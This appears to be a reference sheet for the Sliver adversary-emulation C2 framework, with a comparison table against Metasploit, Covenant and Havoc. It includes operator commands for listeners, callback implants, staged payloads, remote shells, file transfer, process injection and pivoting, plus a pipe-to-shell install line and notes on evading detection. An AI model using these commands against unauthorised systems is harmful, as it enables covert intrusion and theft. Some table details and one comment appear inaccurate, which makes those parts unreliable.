# C2 Frameworks Reference

> Source: [BishopFox/sliver](https://github.com/BishopFox/sliver) — v1.7.3 (Feb 2026)

## Sliver Architecture

Sliver is a Go-based, cross-platform adversary emulation framework. Architecture layers:

```
┌──────────────────────────────────────────────────┐
│                   Sliver Client                   │
│  (CLI / gRPC / Python bindings)                   │
├──────────────────────────────────────────────────┤
│                  Sliver Server                    │
│  ┌──────────┐ ┌──────────┐ ┌──────────────────┐   │
│  │ gRPC API  │ │ Operator │ │  HTTP/DNS/WG     │   │
│  │ (mTLS)    │ │Console   │ │  Listener Mux     │   │
│  └──────────┘ └──────────┘ └──────────────────┘   │
├──────────────────────────────────────────────────┤
│                     Implants                      │
│  ┌──────────────────────────────────────────────┐ │
│  │ mTLS  │ WireGuard │ HTTP(S) │ DNS  │ Pivot   │ │
│  └──────────────────────────────────────────────┘ │
│  ┌──────────────────────────────────────────────┐ │
│  │ Extensions: .NET exec, COFF/BOF, execute-   │ │
│  │ assembly, process injection, token manip     │ │
│  └──────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────┘
```

### Key Components

| Component | Description |
|-----------|-------------|
| **Server** | Multiplayer gRPC server. Handles implant sessions, listener management, operator authorization |
| **Client** | CLI or Python client connecting to server over mutual TLS |
| **Implant** | Per-binary compiled Go payload — dynamically generated with unique asymmetric keys |
| **Listeners** | mTLS, WireGuard, HTTP(S), DNS — can run simultaneously on multiple ports |
| **Extensions** | In-memory .NET assembly loader, COFF/BOF loader, sideload, execute-shellcode |
| **Pivots** | TCP and named-pipe pivots through existing implants |

## Installation

### Linux (One-liner)

```bash
curl https://sliver.sh/install | sudo bash
sliver
```

### From Source (latest)

```bash
# Requires Go 1.21+
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
```

### Docker

```bash
docker pull bishopfox/sliver
docker run -it bishopfox/sliver
```

## Listener Setup

```bash
# Start mTLS listener (port 443)
sliver > mtls --lhost 0.0.0.0 --lport 443

# Start HTTP(S) listener with Let's Encrypt
sliver > http --lhost yourdomain.com --lport 443 --lets-encrypt

# Start DNS listener (requires NS delegation)
sliver > dns --lhost 0.0.0.0 --lport 53 --domains c2.yourdomain.com

# Start WireGuard listener
sliver > wg --lhost 0.0.0.0 --lport 51820
```

## Implant Generation

```bash
# Generate default implant (mTLS)
sliver > generate --http 192.168.1.100:443 --save /tmp/implant

# Staged payload (small downloader → stage2)
sliver > generate --mtls 192.168.1.100:443 --staged --save /tmp/stager

# Stageless with specific OS/arch
sliver > generate --mtls 192.168.1.100:443 --os windows --arch 64 --format exe --save /tmp/win.exe

# Add extensions
sliver > generate --mtls 192.168.1.100:443 --extensions execute-assembly,coff-loader

# Encrypt transport with WireGuard
sliver > generate --wg 192.168.1.100:51820 --key <preshared-key>
```

## Session Management

```bash
# List active sessions
sliver > sessions

# Interact with a session
sliver > use <session-id>

# Execute commands on implant
sliver (implant) > shell

# Upload/download files
sliver (implant) > upload /path/to/file
sliver (implant) > download /remote/path

# Process injection
sliver (implant) > inject <pid> /path/to/shellcode.bin

# Pivot through implant
sliver (implant) > pivots add tcp --bind 0.0.0.0:1080

# Socks5 proxy
sliver (implant) > socks5 start
```

## C2 Framework Comparison

| Feature | Sliver | Metasploit | Covenant | Havoc |
|---------|--------|------------|----------|-------|
| **Language** | Go | Ruby (MSF), C (payloads) | C# (.NET) | C++/Qt (server), Nim (client) |
| **Implant Language** | Go | C/Meterpreter | C# | Nim/Go |
| **Detection Evasion** | High — compile-time obfuscation, per-binary keys, staged payloads, COFF/BOF loader | Medium — signature-based detection common; staged payloads help | Medium — .NET detection by AMSI/ETW; must use AMSI bypasses | High — indirect syscalls, sleep obfuscation, Win32 API hashing |
| **Active Maintenance** | ✅ Very active — v1.7.3 (Feb 2026), 5.6k+ commits | ✅ Active — Rapid7-backed, monthly releases | ⚠️ Moderate — less frequent updates since v0.6 | ✅ Active — frequent releases, growing community |
| **Cloud-Native Support** | ✅ Built-in mTLS, WireGuard, HTTP(S), DNS; Let's Encrypt integration | ⚠️ Via third-party modules (e.g., MSF Venom + cloud C2 redirectors) | ❌ No native cloud support | ❌ No native cloud support |
| **Multiplayer** | ✅ Native multi-operator gRPC | ✅ MSF RPC / Armitage | ✅ Multiplayer via SQLite DB | ✅ Multiplayer via team server |
| **Payload Types** | Staged + stageless; EXE/DLL/SO/.NET/COFF | Staged + stageless; EXE/DLL/VBA/PS1/PY | Staged (Grunt); DLL/EXE | Staged + stageless; EXE/DLL |
| **Pivoting** | TCP, named pipe, socks5 | Route, socks4a, portfwd | SMB, reverse port forward | Socks5, reverse port forward |
| **Logging** | Encrypted C2, evidence collection, canary detection | Full event log, database-backed | Encrypted SQLite | JSON logging |
| **Ease of Setup** | ✅ One-liner install | ⚠️ Requires Ruby, PostgreSQL, Nmap | ⚠️ Requires .NET SDK | ⚠️ Requires Qt, CMake, xmake |
| **Windows Evasion** | ✅ Process injection, token manipulation, .NET in-memory, COFF/BOF | ⚠️ Reflective DLL injection, but commonly signatured | ⚠️ .NET-based, heavily monitored by Defender | ✅ Indirect syscalls, ret/gadget, sleep masking |
| **Cross-Platform Server** | ✅ Linux, macOS, Windows | ✅ Linux, macOS, Windows | ✅ Linux (via .NET), Windows | ✅ Linux, Windows |
| **Cross-Platform Implants** | ✅ Linux, macOS, Windows | ⚠️ Primarily Windows; Linux/macOS via staged | ❌ Windows only (C#/.NET) | ✅ Windows, Linux (Nim client) |

## Sources

- [BishopFox/sliver GitHub](https://github.com/BishopFox/sliver) — README, releases, wiki
- [Sliver Official Docs](https://sliver.sh/docs?name=Getting+Started)
- [Havoc Framework](https://github.com/HavocFramework/Havoc)
- [Covenant](https://github.com/cobbr/Covenant)
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
